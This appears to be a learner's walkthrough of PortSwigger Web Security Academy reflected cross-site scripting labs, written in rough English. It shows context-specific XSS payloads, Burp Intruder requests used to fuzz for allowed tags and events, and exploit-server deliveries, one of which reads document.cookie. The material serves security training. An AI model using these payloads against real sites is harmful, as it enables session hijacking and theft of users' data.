## XXX(Cross-site scripting)

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions
that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities
normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data.
If the victim user has privileged access within the application,
then the attacker might be able to gain full control over all of the application's functionality and data. 


## 1. Reflected XSS into HTML context with nothing encoded

You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html like

    <h1>
    0 search results for 'asif'
    </h1>
     

 ## This is Vulnerably

 ## 2. Reflected XSS into attribute with angle brackets HTML-encoded
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html input filed like
 
    <input type=text placeholder='Search the blog...' name=search value="asif">

Notice That 

    name=search value="asif" 
    
 The asif is double '' so use the paylods like double '' for example 
 
    "onmouseover="alert(1)
    
 
 ## This is Vulnerably
 
 
 ## 3. Reflected XSS into a JavaScript string with angle brackets HTML encoded 
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in JavaScript filed like
 
    <script>
    var searchTerms = 'asif';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
 
 Paylods 
 
    '-alert(1)-'
 
 
 ## This is vulnerably 
 
 
 ## 4. Reflected XSS into HTML context with most tags and attributes blocked
 
 You Have a Search Funtion and search like asif and intercept the request and sand the repeter and Observe that asif is reflected in html This is 
 vulnerably and Inject a standard XSS paylods Observe that this gets blocked most html tages attributes are blocked.
 
You Have a Search Funtion and search like asif and intercept the request and sand the intruder and remove asif and add <> and set paylods in <> like <$$> 
 
    GET /?search=<$$> HTTP/1.1
    Host: 0a130031045b2eeac06b090600110008.web-security-academy.net
    Cookie: session=Xvy6OLwWRumjRFxHQqruIfV77mnV5YmN
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0a130031045b2eeac06b090600110008.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
 
Visit the XSS cheat sheet and click "Copy tags to clipboard". 

In Burp Intruder, in the Payloads tab, click "Paste" to paste the list of tags into the payloads list. Click "Start attack".

When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the body payload, which caused a 200 response. 

## body tags is 200 Ok

Go back to the Positions tab in Burp Intruder and replace your search term and set paylods position <body%20&&=1> like 

    GET /?search=<body%20§§=1> HTTP/1.1
    Host: 0ac4000e03c21f41c110a9200039006d.web-security-academy.net
    Cookie: session=743GVgVjqrfVKWWEuPfUvbDnYFHCsM5l
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: https://0ac4000e03c21f41c110a9200039006d.web-security-academy.net/
    Upgrade-Insecure-Requests: 1
    Sec-Fetch-Dest: document
    Sec-Fetch-Mode: navigate
    Sec-Fetch-Site: same-origin
    Sec-Fetch-User: ?1
    Te: trailers
    Connection: close
   

 Visit the XSS cheat sheet and click "copy events to clipboard".
 
 In Burp Intruder, in the Payloads tab, click "Clear" to remove the previous payloads. Then click "Paste" to paste the list of attributes into the  payloads list. Click "Start attack".
 
 When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onresize payload, which caused a 200 response. 
 
 ## onresize 200 ok
 
 Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
 
    <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
     
  Click "Store" and "Deliver exploit to victim". 
 
 
 ## 5. Reflected XSS into HTML context with all tags blocked except custom ones
 
  Go to the exploit server and paste the following code, replacing your-lab-id with your lab ID: 
  
    <script>
    location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>
  
 Click "Store" and "Deliver exploit to victim".
 
 
 
 
 
 
